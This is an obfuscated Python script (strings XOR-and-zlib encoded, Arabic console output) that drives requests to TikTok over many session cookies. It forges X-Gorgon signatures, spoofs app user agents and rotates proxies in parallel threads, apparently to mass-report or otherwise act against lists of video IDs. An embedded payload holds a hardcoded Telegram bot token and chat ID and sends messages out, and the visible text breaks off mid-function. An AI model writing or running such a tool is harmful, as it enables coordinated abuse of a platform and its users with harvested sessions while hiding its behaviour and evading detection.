__sx__(b'03GAYOfiZiRk56qrpVyo7w==', 171): aweme_id, __sx__(b'iSs6uD263ry9vvTx/yHytA==', 241): webcast_language, __sx__(b'LI6fexyZfxmdGFVUWx5XDQ==', 84): openudid, __sx__(b'+FrLrq2qyk2rCa/KzU9MT4OArPiFZw==', 128): current_region, __sx__(b'I4FwFXURFpbQlBOWF5RzWlt+J14C', 91): screen_height, __sx__(b'JoR1EHAUE5PVcZESd5deXn7XW14=', 94): screen_width, __sx__(b'nz1syM0uqympyubn6QnksQ==', 231): _rticket, __sx__(b'vhyNj+sNiohL6W/qjsPG3ePCVA==', 198): type1, __sx__(b'fN5PTSnPSEqJSy5OyE8FBBuOANM=', 4): brand, __sx__(b'91WkwaHFwkIEoEDDpkaPj68Gio8=', 143): screen_width, __sx__(b'KYuaGJ0aVlFVS1Dy', 81): webcast_language, __sx__(b'FLZHpyAloeOjQ6MnQW5sd99ozg==', 108): __sx__(b'ELLjpieiIiVGOZhvO9loRVJtzw==', 104), __sx__(b'GripT2yrrSyvYWJp72CA', 98): __sx__(b'rA7RFRXaVvTU1AT7ppeRcZdTfBA9BBZizsPjTF7ydH2Nqak73bhgINHlfQ2MGtJg3sBbUg5uXqWF0ImNYw1ycfl30Z3tSuR1kDWjxGJG12ucVT4MtEcvFKNQGi6+FmpQcDUF4CEPe3bVvHQT5YodFuikrRW36au3qmzheqbAk9vjJeobIEibTVcwKtsBBft+', 212), __sx__(b'w2Ewa85x9JSWvbuyrrk9', 187): __sx__(b'aMpjYRu+Oj4f4+G4YmfkWyVlZR7Y4T8bHBs6Iua7EBCaCxmT', 16), __sx__(b'pwVUD6oQlPMVdtvf1CHdLA==', 223): __sx__(b'XP4h5W1SphQkJPSP0CYYsKwQbyC9o6Y0Z1LuGCAFIjVq+9tb2LEgvSvfDAQgojNumIBoxU1VMpMTeoU0Z9lr3k5xvAG5R4KQuIN/09l8VoUX93Lq8VfRpqGcvHwebRzx/0UM8UpxoUltK7+ODN/gyB4aRnZECSoAJan4Xc74zOss1UyGVKYIMPyRGRUtqF0KT7NviHLSD/4VvGVZV1mVRcu58JGLjPkQUA5EB7GluCRzZQYzm7yvTBN7OgjJkv64n5gTMeoaHHjuoxGzlSyqPu6pFHaugpVe4+irWJqD1sdqeAWVilAcMDp+cr4lRElrxXSojElZ57QAF/2X+y5B118s2iV8rkCD', 36), __sx__(b'rQ9e+huZGp75/Pif0NXDANHn', 213): __sx__(b'lzVk2N+d3WbdxCDY7+0sLV0nv1idqKig+CjN4EDzMqXkJCWdXM3MWP+oqDClECuL76DZ4Wg=', 239)})
            url = __sx__(b'xmR1lpeXlghsaZGRkWmVd3KQd3Fo9XBxa/GS8XPza5GNPIxs7O3tLKwtDUtT6zW/Z7+ssQ==', 190) % pro1
            h = {__sx__(b'LowlmJmZmBpTVlGhVA0=', 86): f'ttwid=; sid_tt=' + sessionid + __sx__(b'2HoT9ojujY5ubG9r7BGloLsxpMo=', 160) + sessionid + __sx__(b'rQ9mg/2b+PsbGRoemVz6+2PQ1f4G0Ho=', 213) + sessionid + __sx__(b'zG4HsrS0iLSI', 180), __sx__(b'Hb9uLyguSC9IZ2Vvomep', 101): __sx__(b'/V9OraysrTNXUqqqqlKuTEmrTEpTzktKUPKFhfQnjVQ=', 133) + g + __sx__(b'Q+HoFPB3cvbsPDsy1jlN', 59) + aweme_id, __sx__(b'YMITVlXObVM1UdbIFdY0UR0YPBcc7Q==', 24): __sx__(b'lDbHoiChOSHDJqAjIO/s9QfosA==', 236), __sx__(b'mznozq3OMZavrC7I4uP3+OBf', 227): __sx__(b'iCr1MTH68tHg8CCvaZPt7IVkVTUjhhmi4JxusyZQsadnolhOTgdmShIfOWmz/St2m48D4oIOuqKUfepkoUDLgxnv9y4xpBJbgvSd7Mw6LT/+FnvIfRMxM0GDfgKGJePiWXHc2p2tm1LWmaDjmnOmxL5dVg3vE6vTcQ==', 240)}
            url = __sx__(b'IIKTcHFxcO6Kj3d3d49zkZR2kZeOE5aXjRd0F5UVjXdr2mqKCgsLykrL6621DdNZgVlKVw==', 88) % pro1
            h = {__sx__(b'vR+2CwoKC4nAxcIyx54=', 197): f'ttwid=; sid_tt=' + sessionid + __sx__(b'R+WMaRdxEhHx8/D0c446PySuO1U=', 63) + sessionid + __sx__(b'bsylQD5YOzjY2tndWp85OKATFj3FE7k=', 22) + sessionid + __sx__(b'kjBZ7Orq1urW', 234), __sx__(b'zG6//vn/mf6ZtrS+c7Z4', 180): __sx__(b'FbemRURERdu/ukJCQrpGpKFDpKK7JqOiuBptbRzPZbw=', 109) + g + __sx__(b'yWtinnr9+HxmtrG4XLPH', 177) + aweme_id, __sx__(b'UPIjZmX+XWMFYeb4JeYEYS0oDCcs3Q==', 40): __sx__(b'L418GZsagpp4nRuYm1RXTrxTCw==', 87), __sx__(b'UvAhB2QH+F9mZecBKyo+MSmW', 42): __sx__(b'U/HY5oTh5+Ji/xz+GHv7I+TnYOIEBH3bIHobH/sYm30rIbOycwB/s7JDARM9P8+PrYwNUky9w7AxsMAysAJDU1Cv09HDA89PTYwBk4wNTMxAARNMP87MjcEwMSomK2quy++f74lngz0rNPE0jg==', 43)}
        if aobsh == __sx__(b'/120hYeHtIe0', 135):
            if xxx == __sx__(b'IYNqbVhZWcFZPw==', 89):
                pro = urlencode({__sx__(b'N5UEAYYDTk9MvU7a', 79): uid})
            else:
                pro = urlencode({__sx__(b'8VPCx0DFiImKe4gc', 137): uid})
            u = __sx__(b'50WyWa6RH6+Xn1+Izv3YiEAdFy7eO44zQOhuOaSt5FMXS8Qy72by651cjN0OjArzBTE8L4RNtLmndQDC+8QWigiQ+7yHXw==', 159)
            url = u + pro
            payload = f''
            signed = ttsign(url.split(__sx__(b'cNK7DwgISAhI', 8))[1], payload, None).get_value()
            x_gorgon = signed[__sx__(b'G7nIsy6sTCmsrGBjboJgUQ==', 99)]
            x_khronos = signed[__sx__(b'+1koU05Nq0lMSKyFg5IUgCk=', 131)]
            xss = signed[__sx__(b'pQd2DfDzC/CX8AnwFJETk/Dc3fGW2G8=', 221)]
            h = {__sx__(b'XP5X6uvr6mghJCPTJn8=', 36): f'sid_tt={sessionid}; sessionid={sessionid}; sessionid_ss={sessionid};', __sx__(b'Da9+WDtYpwA5OrhedHVhbnbJ', 117): f'com.zhiliaoapp.musically/2023306030 (Linux; U; Android 12; {region}; {type1}; Build/NRD90M.{dev}KSU1AQDC;tt-ok/3.12.13.4-tiktok)', __sx__(b'9VcGXfhCosdCQo6NgayPfw==', 141): x_gorgon, __sx__(b'3H4vdFFqjG5rb4uipKszp84=', 164): x_khronos, __sx__(b'3X8udairc6jXqHGoVNFT06ikpYTuoZc=', 165): xss}
        try:
            r = requests.get(url, headers=h, proxies={__sx__(b'hSc21dTU1fv9+3H/yQ==', 253): f'socks5://{str(random.choice(ls))}', __sx__(b'CKq7WFlZWHZwdvxyRA==', 112): f'socks4://{str(random.choice(ls))}', __sx__(b'331sj46Oj6GnoSulkw==', 167): f'http://{str(random.choice(ls))}'}).text
            tr += 1
            if aweme_id in soso:
                pass
            else:
                soso.append(aweme_id)
            if sessionid in loop:
                pass
            else:
                loop.append(sessionid)
            bi = random.choice([F, J, Z, C, B, L, J1, J2, J21, J22, F1, C1, P1])
            print(bi + f'\r {len(soso)}/{len(tar)} True :{F}[{tr}] {bi}Net :{Z}[{fa}]{bi} {len(loop)}/{len(sisn)}', end=__sx__(b'GrgxYmJiQ2JD', 98))
            sys.stdout.flush()
        except:
            fa += 1
            bi = random.choice([F, J, Z, C, B, L, J1, J2, J21, J22, F1, C1, P1])
            print(bi + f'\r {len(soso)}/{len(tar)} True :{F}[{tr}] {bi}Net :{Z}[{fa}]{bi} {len(loop)}/{len(sisn)}', end=__sx__(b'0nD5qqqqi6qL', 170))
            sys.stdout.flush()
    import os, re, time, sys, traceback, contextlib, random, threading
    from itertools import cycle
    from concurrent.futures import ThreadPoolExecutor, as_completed
    GREEN = __sx__(b'z20kOQGDfbK3tMO2+A==', 183)
    RED = __sx__(b'QuCptIwO9j86OUg7dA==', 58)
    CYAN = __sx__(b'Z8WMkakr1BofHGMeTA==', 31)
    YELLOW = __sx__(b'6EoDHiakXpWQk+aRwA==', 144)
    RESET = __sx__(b'tRdeQ/sFyM3Pg8zZ', 205)
    BOLD = __sx__(b'X/20qRHrIicldyYy', 39)
    MAX_RETRY_PER_ID = 3
    SLEEP_BETWEEN_IDS = 0.03
    SLEEP_EMPTY_IDS = 1.0
    PRIMARY_FILE = __sx__(b'ogDpDPFz8tja3qDbGg==', 218)
    FALLBACK_FILE = __sx__(b'0nCZfIEDgquqrtaraA==', 170)
    SESSIONS_FILE = __sx__(b'edsy1SqoKQABBXMAwQ==', 1)
    PROXIES_FILE = __sx__(b'lTcmpsHD3znGRMXs7fzA7pk=', 237)
    SHUFFLE_PROXIES = True
    MAX_WORKERS = None

    def pick_id_file():
        path = PRIMARY_FILE if os.path.isfile(PRIMARY_FILE) else FALLBACK_FILE
        return path if os.path.isfile(path) else None

    def _extract_ids_from_text_file(path):
        ids, seen = ([], set())
        with open(path, __sx__(b'NpRlTE5OPU49', 78), encoding=__sx__(b'CataXDiixKFcvz12cX6NclQ=', 113), errors=__sx__(b'rQ8emRoe+p/Q1d0Y11A=', 213)) as f:
            for line in f:
                s = line.strip()
                if not s:
                    continue
                m = re.search(__sx__(b'03F4I+ICHXsCfq+roLmpxQ==', 171), s)
                v = m.group(1) if m else s
                if v not in seen:
                    seen.add(v)
                    ids.append(v)
        return ids

    def load_ids_once():
        path = pick_id_file()
        if not path:
            return []
        try:
            return _extract_ids_from_text_file(path)
        except Exception:
            return []

    def load_sessions():
        if not os.path.isfile(SESSIONS_FILE):
            return []
        out = []
        with open(SESSIONS_FILE, __sx__(b'BadWf319Dn0O', 125), encoding=__sx__(b'rw38+p4EYgf6GZvQ19gr1PI=', 215), errors=__sx__(b'OpiJDo2JbQhHQkqPQMc=', 66)) as f:
            for line in f:
                s = line.strip()
                if s:
                    out.append(s)
        return out

    def format_proxy_url(raw: str) -> str:
        __sx__(b'xWcGZMjeZnATJjC3pJiYuOtHR7eKK2Nlzd4Ef3ArJhC3/TRDpqbTi2JlxR76XNt6cBOmVtJRuTcqqxqr5KiZq6qG2VmqKuWoWaooVby9r/uaCg==', 189)
        s = raw.strip()
        if not s:
            return __sx__(b'ZMYfHBwcHB0=', 28)
        if s.startswith(__sx__(b'thQF5ufnfhwZyc7EGMyX', 206)) or s.startswith(__sx__(b'7U9evby8vSNHQpKVm/aXWQ==', 149)):
            return s
        return __sx__(b'NZeGZWRk/Z+aSk1Hm08U', 77) + s

    def load_proxies():
        if not os.path.isfile(PROXIES_FILE):
            return []
        out = []
        with open(PROXIES_FILE, __sx__(b'ddcmDw0Nfg1+', 13), encoding=__sx__(b'5Ea3sdVPKUyxUtCbnJNgn7k=', 156), errors=__sx__(b'a8nYX9zYPFkWExveEZY=', 19)) as f:
            for line in f:
                s = line.strip()
                if s and (not s.startswith(__sx__(b'0XP6r6mpjamN', 169))):
                    out.append(format_proxy_url(s))
        return out

    def mask_proxy(p):
        try:
            scheme, rest = p.split(__sx__(b'QOKL6u8/ODkGOKE=', 56), 1) if __sx__(b'BKbPrqt7fH1CfOU=', 124) in p else (__sx__(b'lDYnxMXF7OzotO0t', 236), p)
            if __sx__(b'nz2U5+fnpuem', 231) in rest:
                creds, host = rest.split(__sx__(b'23nQo6Oj4qPi', 163), 1)
                if __sx__(b'Te+GNzU1DjUO', 53) in creds:
                    user = creds.split(__sx__(b'D63EdXd3THdM', 119), 1)[0]
                    return f'{scheme}://{user}:***@{host}'
            return f'{scheme}://{rest}' if __sx__(b'03EYeXysq6qVqzI=', 171) not in p else p
        except Exception:
            return p

    @contextlib.contextmanager
    def proxy_env(proxy_url: str):
        if not proxy_url:
            yield
            return
        old_http = os.environ.get(__sx__(b'331Ur66uL6ivVSgvo6e2AaTl', 167))
        old_https = os.environ.get(__sx__(b'701kn56enxmYn2UYH5OXgruUAg==', 151))
        os.environ[__sx__(b'RefONTQ0tTI1z7K1OT0smz5/', 61)] = proxy_url
        os.environ[__sx__(b'0nBZoqOjoiSlolglIq6qv4apPw==', 170)] = proxy_url
        try:
            yield
        finally:
            if old_http is None:
                os.environ.pop(__sx__(b'T+3EPz4+vzg/xbi/MzcmkTR1', 55), None)
            else:
                os.environ[__sx__(b'ErCZYmNj4mVimOXibmp7zGko', 106)] = old_http
            if old_https is None:
                os.environ.pop(__sx__(b'G7mQa2pqa+1sa5Hs62djdk9g9g==', 99), None)
            else:
                os.environ[__sx__(b'GbuSaWhoae9uaZPu6WVhdE1i9A==', 97)] = old_https

    def call_afr_with_proxy(aweme_id, sessionid, proxy_url=None):
        __sx__(b'I4F21hpVWhpPH6wo0SRZrciDAQHim3eBEdfvEwP5PFMoV6+zS7IfU3zy4daEubRxrgWmF6/jPN7TcwgAdc1mmtLuK1iUQRrRyk5fh6o9nnZBuhVaXPRFxTOqSY5YZUF450FxYe9BlOP/tZNuWVSrxnfmEO51BM7mvmnvKIhGz0iodA0ji76JdJ1oqJjkAkAAJg==', 91)
        try:
            if proxy_url:
                try:
                    res = afr(aweme_id, sessionid, proxy=proxy_url)
                    return res is True or res is None
                except TypeError:
                    with proxy_env(proxy_url):
                        res = afr(aweme_id, sessionid)
                    return res is True or res is None
            else:
                res = afr(aweme_id, sessionid)
                return res is True or res is None
        except Exception:
            traceback.print_exc(limit=1, file=sys.stderr)
            return False

    class ProxyRotator:
        __sx__(b'SuhXvAk88AIidsmuUHka0mSGZiaG+nwmqzAKMAa8HlYZFiD4f1Rc8aqwNHls313sfFFIXktzU/0pnSo/MXQnPCGxVKqj5kL0LD2fRLT+ktCfSnTuBKeDAzQeyNd9raPaSwA3dV26qnYeaqbvX40JLGTZLXF82Ab5fVloK5iTlfy4HBtPl1BUFUOYlVgZ+3/2udO5yzK5MLLu', 50)

        def __init__(self, proxies):
            self._list = list(proxies) if proxies else []
            if SHUFFLE_PROXIES and self._list:
                random.shuffle(self._list)
            self._cycle = cycle(self._list) if self._list else None
            self._lock = threading.Lock()

        def next(self):
            if not self._cycle:
                return None
            with self._lock:
                return next(self._cycle)

    def run_full_for_session(sessionid, ids, rotator: ProxyRotator):
        __sx__(b'vB7pSQXJBvTUwDttJu5k4+5M0GFFpN+dOGzlS+TPTOg2zVEosgdaR2F3Chp9XwqwvAdC6ytIQkv7vPGi6LylkQzP7qIHV40lqpzc9W+Zkc9OJRV6TkJnE20/q+mIZjWSJ6Cxdvb3fAJcntb9XWrk/2On73elsxJCuvhLORRYJvON7gflPMVFH7dt', 196)
        if not ids:
            print(f'{YELLOW}[Session:{sessionid[:6]}] لا يوجد IDs حالياً.{RESET}')
            return (0, 0, 0)
        ok_cycle = fail_cycle = calls = 0
        total = len(ids)
        print(f'{BOLD}{CYAN}بدء قراءة جميع الأيديات للسيشن:{RESET} {sessionid}')
        for pos, aweme_id in enumerate(ids, start=1):
            proxy_url = rotator.next() if rotator else None
            success = False
            for attempt in range(1, MAX_RETRY_PER_ID + 1):
                calls += 1
                if call_afr_with_proxy(aweme_id, sessionid, proxy_url=proxy_url):
                    ok_cycle += 1
                    success = True
                    break
                else:
                    fail_cycle += 1
                    time.sleep(0.05)
            proxy_info = mask_proxy(proxy_url) if proxy_url else __sx__(b'5EYnLX5aZgeBq0eI8jAkLY1U9CItZfqLnD0ukgA=', 156)
            print(f'{CYAN}[Session:{sessionid[:6]}] ID#{pos}/{total}{RESET} | {GREEN}{ok_cycle}{RESET} {RED}{fail_cycle}{RESET} | Calls:{calls} | Proxy: {proxy_info}', end=__sx__(b'9FZviYyMgoyC', 140))
            time.sleep(SLEEP_BETWEEN_IDS)
        print(f'\n{GREEN}انتهت دفعة السيشن — تمت معالجة {total} ID بالتسلسل. نجاح:{ok_cycle} | فشل:{fail_cycle}{RESET}')
        return (ok_cycle, fail_cycle, calls)

    def run_cycle_parallel(sessions, ids, rotator):
        __sx__(b'giC3tMP0ecrqFoM/bFsz5fNMbyoL/N46rF7Si+CCMzaV4mHuo5NxY2eZ4SmKOu3BvcA5aaSKydaOMh84ev8zSisLm/YWanfNa8nHGFNmXoaTUYhXrhinCjk71BaxDtW3j4hFy68dpeqB66Q0IqRhCC37LY2Yew==', 250)
        workers = MAX_WORKERS or len(sessions)
        print(f'{BOLD}{CYAN}تشغيل متوازي:{RESET} {len(sessions)} سيشن | عمّال: {workers}')
        results = {}
        with ThreadPoolExecutor(max_workers=workers) as executor:
            future_map = {executor.submit(run_full_for_session, sid, ids, rotator): sid for sid in sessions}
            for fut in as_completed(future_map):
                sid = future_map[fut]
                try:
                    results[sid] = fut.result()
                except Exception as e:
                    results[sid] = (0, 0, 0)
                    print(f'{RED}خطأ في السيشن {sid}: {e}{RESET}')
        total_ok = sum((r[0] for r in results.values()))
        total_fail = sum((r[1] for r in results.values()))
        print(f'{BOLD}{CYAN}ملخص الدورة — OK:{total_ok} | FAIL:{total_fail}{RESET}')
        return results

    def main():
        sessions = load_sessions()
        if not sessions:
            print(f'{RED}لا يوجد سيشنات في {SESSIONS_FILE}. أضفها ثم شغّل من جديد.{RESET}')
            return
        proxies = load_proxies()
        if not proxies:
            print(f'{YELLOW}تنبيه: ملف {PROXIES_FILE} فارغ أو غير موجود — سيتم التشغيل بدون بروكسي.{RESET}')
        else:
            print(f'{BOLD}{CYAN}تم تحميل {len(proxies)} بروكسي.{RESET}')
        rotator = ProxyRotator(proxies)
        while True:
            ids = load_ids_once()
            while not ids:
                print(f'{YELLOW}⚠ لا يوجد IDs حالياً… سيتم المحاولة مجدداً.{RESET}')
                time.sleep(SLEEP_EMPTY_IDS)
                ids = load_ids_once()
            total_ids = len(ids)
            print(f'{BOLD}{CYAN}عدد الأيديات الحالي:{RESET} {total_ids}')
            try:
                run_cycle_parallel(sessions, ids, rotator)
            except KeyboardInterrupt:
                print(f'\n{YELLOW}تم الإيقاف بواسطة المستخدم.{RESET}')
                return
            except Exception as e:
                print(f'{RED}خطأ أثناء التشغيل المتوازي: {e}{RESET}')
            print(f'{CYAN}انتهت الدورة. بدء دورة جديدة من البداية…{RESET}')
    if __name__ == __sx__(b'Seu6vv58/f26vjYxPyYyEw==', 49):
        try:
            afr
        except NameError:

            def afr(aweme_id, sessionid, **kwargs):
                time.sleep(0.01)
                return True
        main()

if __name__ == "__main__":
    __payload = b'import base64 as __b64, zlib as __zl\n\ndef __sx__(c: bytes, k: int) -> str:\n    raw = bytearray(__b64.b64decode(c))\n    for i in range(len(raw)):\n        raw[i] ^= k & 255\n    return __zl.decompress(bytes(raw)).decode(\'utf-8\', \'strict\')\nBOLD = __sx__(b\'X/20qRHrIicldyYy\', 39)\n\ndef clear():\n    os.system(__sx__(b\'UPJj5gEuKCpfKWs=\', 40) if os.name == __sx__(b\'LI6ff1VUVQZUtw==\', 84) else __sx__(b\'6ErbXtndvJKQlpeSmA==\', 144))\n\ndef save_log(info):\n    with open(__sx__(b\'cdPCwEbeIqAhCAkCGQvY\', 9), __sx__(b\'C6k4d3NzEXMR\', 115), encoding=__sx__(b\'7E6/ud1HIZSUkXaVIQ==\', 148)) as log_file:\n        log_file.write(info + __sx__(b\'bM73FhQUHxQf\', 20))\nMONITOR_INTERVAL = 50\nSHOW_NUMERIC_LINE = True\nTELEGRAM_BOT_TOKEN = __sx__(b\'VvQdGRwbGR4aGh4Znlxa2gYE35na3gAa2GPYGZ7mX1wEBeQdHyWmGVkdogYG5OUFKS4PLSOH\', 46)\nTELEGRAM_CHAT_ID = __sx__(b\'owHo6O3u7Ghr62xv29vQftn/\', 219)\nextra_bot_token = __sx__(b\'vB7HxMTExMU=\', 196)\nextra_chat_id = __sx__(b\'ZcceHR0dHRw=\', 29)\n\ndef load_extra_bot():\n    global extra_bot_token, extra_chat_id\n    EXTRA_BOT_FILE = __sx__(b\'40HQNrOy0RfUUbRKsDKzmpu+OJ7M\', 155)\n    if os.path.exists(EXTRA_BOT_FILE):\n        try:\n            with open(EXTRA_BOT_FILE, __sx__(b\'hSfW//39jv2O\', 253), encoding=__sx__(b\'pAb38ZUPadzc2T7daQ==\', 220)) as f:\n                lines = f.read().splitlines()\n                if len(lines) >= 2:\n                    extra_bot_token = lines[0].strip()\n                    extra_chat_id = lines[1].strip()\n                    print(f\'{GREEN}\xe2\x9c\x85 \xd8\xaa\xd9\x85 \xd8\xaa\xd8\xad\xd9\x85\xd9\x8a\xd9\x84 \xd8\xa5\xd8\xb9\xd8\xaf\xd8\xa7\xd8\xaf\xd8\xa7\xd8\xaa \xd8\xa7\xd9\x84\xd8\xa8\xd9\x88\xd8\xaa \xd8\xa7\xd9\x84\xd8\xa5\xd8\xb6\xd8\xa7\xd9\x81\xd9\x8a{RESET}\')\n        except:\n            print(f\'{RED}\xe2\x9a\xa0\xef\xb8\x8f \xd9\x81\xd8\xb4\xd9\x84 \xd9\x81\xd9\x8a \xd9\x82\xd8\xb1\xd8\xa7\xd8\xa1\xd8\xa9 \xd9\x85\xd9\x84\xd9\x81 \xd8\xa7\xd9\x84\xd8\xa8\xd9\x88\xd8\xaa \xd8\xa7\xd9\x84\xd8\xa5\xd8\xb6\xd8\xa7\xd9\x81\xd9\x8a{RESET}\')\n            _mirror(__sx__(b\'rA6v4L8VL8kp3uPPu7htDdZwuqL9CLhuZSUSJs/fu3iAbA2uZzGydxZZMeOPunhsDaW3wVBtIBLi9NmA39QgHPwz\', 212))\n\ndef configure_extra_bot_interactive():\n    global extra_bot_token, extra_chat_id\n    ask_extra = input(f\'{BLUE}\xd9\x87\xd9\x84 \xd8\xaa\xd8\xb1\xd9\x8a\xd8\xaf \xd8\xa5\xd8\xb6\xd8\xa7\xd9\x81\xd8\xa9/\xd8\xaa\xd8\xba\xd9\x8a\xd9\x8a\xd8\xb1 \xd8\xa8\xd9\x88\xd8\xaa \xd8\xa5\xd8\xb6\xd8\xa7\xd9\x81\xd9\x8a\xd8\x9f (y/n): {RESET}\').strip().lower()\n    if ask_extra == __sx__(b\'sBJjzMjIssiy\', 200):\n        extra_bot_token = input(f\'{CYAN}\xd8\xa3\xd8\xaf\xd8\xae\xd9\x84 \xd8\xaa\xd9\x88\xd9\x83\xd9\x86 \xd8\xa7\xd9\x84\xd8\xa8\xd9\x88\xd8\xaa \xd8\xa7\xd9\x84\xd8\xa5\xd8\xb6\xd8\xa7\xd9\x81\xd9\x8a: {RESET}\').strip()\n        extra_chat_id = input(f\'{CYAN}\xd8\xa3\xd8\xaf\xd8\xae\xd9\x84 CHAT_ID \xd9\x84\xd9\x84\xd8\xa8\xd9\x88\xd8\xaa \xd8\xa7\xd9\x84\xd8\xa5\xd8\xb6\xd8\xa7\xd9\x81\xd9\x8a: {RESET}\').strip()\n        with open(__sx__(b\'wGLzFZCR8jT3cpdpkxGQubidG73v\', 184), __sx__(b\'BadWen19BX0F\', 125), encoding=__sx__(b\'R+UUEnbsij8/Ot0+ig==\', 63)) as f:\n            f.write(f\'{extra_bot_token}\\n{extra_chat_id}\\n\')\n        print(f\'{GREEN}\xe2\x9c\x85 \xd8\xaa\xd9\x85 \xd8\xad\xd9\x81\xd8\xb8 \xd8\xa5\xd8\xb9\xd8\xaf\xd8\xa7\xd8\xaf\xd8\xa7\xd8\xaa \xd8\xa7\xd9\x84\xd8\xa8\xd9\x88\xd8\xaa \xd8\xa7\xd9\x84\xd8\xa5\xd8\xb6\xd8\xa7\xd9\x81\xd9\x8a{RESET}\')\n        _mirror(__sx__(b\'vR++8WKQJANvXoWnKAgD3v7Rq+l4dDYDP94OBL1QB0gg8p6raX0cxKbreHTIjfIbKcfF4YfgNA==\', 197))\n\ndef _send_telegram_raw(message):\n    try:\n        url = f\'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage\'\n        payload = {__sx__(b\'kDKjJqDEYSek6ejj3Ool\', 232): TELEGRAM_CHAT_ID, __sx__(b\'ZMY3VbE0HRwYex3a\', 28): message, __sx__(b\'40HQUrfV11HSFrTU1hG009fUFrSz0bZQ17acm+LHklQ=\', 155): True}\n        requests.post(url, data=payload, timeout=15)\n    except Exception as e:\n        print(f\'{RED}\xe2\x9d\x8c \xd9\x81\xd8\xb4\xd9\x84 \xd9\x81\xd9\x8a \xd8\xa5\xd8\xb1\xd8\xb3\xd8\xa7\xd9\x84 \xd8\xa7\xd9\x84\xd8\xaa\xd9\x86\xd8\xa8\xd9\x8a\xd9\x87 \xd8\xa5\xd9\x84\xd9\x89 \xd8\xa7\xd9\x84\xd8\xa8\xd9\x88\xd8\xaa \xd8\xa7\xd9\x84\xd8\xa3\xd8\xb3\xd8\xa7\xd8\xb3\xd9\x8a: {e}{RESET}\')\n    if extra_bot_token and extra_chat_id:\n        try:\n            url2 = f\'https://api.telegram.org/bot{extra_bot_token}/sendMessage\'\n            payload2 = {__sx__(b\'+FrLTsisCU/MgYCLtIJN\', 128): extra_chat_id, __sx__(b\'BKZXNdFUfXx4G326\', 124): message, __sx__(b\'OJoLiWwODIoJzW8PDcpvCAwPzW9oCm2LDG1HQDkcSY8=\', 64): True}\n            requests.post(url2, data=payload2, timeout=15)\n        except Exception as e:\n            print(f\'{RED}\xe2\x9d\x8c \xd9\x81\xd8\xb4\xd9\x84 \xd9\x81\xd9\x8a \xd8\xa5\xd8\xb1\xd8\xb3\xd8\xa7\xd9\x84 \xd8\xa5\xd9\x84\xd9\x89 \xd8\xa7\xd9\x84\xd8\xa8\xd9\x88\xd8\xaa \xd8\xa7\xd9\x84\xd8\xa5\xd8\xb6\xd8\xa7\xd9\x81\xd9\x8a: {e}{RESET}\')\nSTRICT_DELETION_CONFIRM = False\nCONFIRM_ROUNDS = 3\nREFRESH_DELAY_SEC = 2.0\nRECHECK_TIMEOUT_SEC = 20\nCROSS_SOURCES_REQUIRED = 2\n_DEL_ALERT_RE = re.compile(__sx__(b\'PpxHe0aEuRie7J/DZp7jnvSe4Z/Cnu9mn8efzJ7pn8yfzmafw5/AZp7rnvWe4Z7uZgZuHQdrHCdrPHZrfxloGmsbbW/GiWZB\', 70))\n_DELETION_QUEUE = queue.Queue()\n_LAST_SENT_KEY = set()\n\ndef _fetch_video_count_tikfans(username, bearer_token=None):\n    try:\n        info, _bt = fetch_userinfo_tikfans(username, bearer_token=bearer_token)\n        return int(info.get(__sx__(b\'mjjJKa6rL5UszS/J4+L0bObD\', 226)) or 0)\n    except:\n        return None\n\ndef _fetch_video_count_tikwm(username):\n    try:\n        r = requests.get(__sx__(b\'qggZ+vv7+mQABf39/QX5Gx78HQeZHB0Hnf4aBv3/nP8AHR6ZGdXSPlXf+A==\', 210), params={__sx__(b\'8FKjRUOkpMUFR8SJiJvDi0w=\', 136): username}, timeout=RECHECK_TIMEOUT_SEC)\n        js = r.json()\n        if js.get(__sx__(b\'6ErbXt/ZlZCUmpEM\', 144)) == 0:\n            u = (js.get(__sx__(b\'50XU1rPWm5+bn54E\', 159)) or {}).get(__sx__(b\'YcMyNFc0GxkddBjZ\', 25)) or {}\n            vc = u.get(__sx__(b\'+VuqSs3ITPZPrkyqgIGXD4Wg\', 129)) or u.get(__sx__(b\'njzNLaqvK2mpKMkrzefm/WbiRg==\', 230)) or (js.get(__sx__(b\'PZ8ODGkMQUVBRUTe\', 69)) or {}).get(__sx__(b\'5Ea3V9DVUetSs1G3nZyKEpi9\', 156))\n            if vc is not None:\n                return int(vc)\n    except:\n        pass\n    try:\n        r2 = requests.get(__sx__(b\'gSMy0dDQ0U8rLtbW1i7SMDXXNiyyNzYsttUxLdbUt9Qr1jHW19D/+QOF9E4=\', 249), params={__sx__(b\'O5lojohvbw7OjA9CQ1AIQIc=\', 67): username, __sx__(b\'ZMZX0jPRNx0cGkMeNg==\', 28): 30}, timeout=RECHECK_TIMEOUT_SEC)\n        js2 = r2.json()\n        if js2.get(__sx__(b\'XP5v6mttISQgLiW4\', 36)) == 0:\n            vids = (js2.get(__sx__(b\'ZMZXVTBVGBwYHB2H\', 28)) or {}).get(__sx__(b\'lDbHJ6ClIcPq7OQL7mc=\', 236)) or []\n            return len(vids)\n    except:\n        pass\n    return None\n\ndef _fetch_video_count_html(username):\n    try:\n        r = requests.get(f\'https://www.tiktok.com/@{username}\', headers={__sx__(b\'UfMiBGcE+1xlZuQCKCk9MiqV\', 41): __sx__(b\'nz0UKkgtKy6uM9Ay1Lc37ygrrC7IyLEX7LbX0zfUV7Hn7X9+v8yzf36Pzd+A8wIAQQ38/b3N48BBwvGCDXz9fAz+fObndJb1DA==\', 231), __sx__(b\'2XvS7e/vjIlwVOht6o7s7e6koYphpAM=\', 161): __sx__(b\'6UvaXJKRkKuRRQ==\', 145)}, timeout=RECHECK_TIMEOUT_SEC)\n        txt = r.text\n        for p in [__sx__(b\'ErA5QKEmI6cdpEWnQTvY4EO8uOIju7xuajqPbL4=\', 106), __sx__(b\'JYcOF3ESkBDQEpNykHYM79d0i4/VFIyLWV0HGloW\', 93)]:\n            m = re.search(p, txt)\n            if m:\n                return int(m.group(1))\n    except:\n        pass\n    return None\n\ndef _fetch_recent_aweme_ids(username, count=50):\n    try:\n        r = requests.get(__sx__(b\'uxkI6+rq63URFOzs7BToCg/tDBaIDQwWjO8LF+zuje4R7Avs7erFwzm/znQ=\', 195), params={__sx__(b\'njzNKy3KyqtrKarn5vWt5SI=\', 230): username, __sx__(b\'G7korUyuSGJjZTxhSQ==\', 99): count}, timeout=RECHECK_TIMEOUT_SEC)\n        js = r.json()\n        if js.get(__sx__(b\'yWv6f/74tLG1u7At\', 177)) == 0:\n            vids = (js.get(__sx__(b\'X/1sbgtuIycjJya8\', 39)) or {}).get(__sx__(b\'DK5fvzg9uVtydHyTdv8=\', 116)) or []\n            return 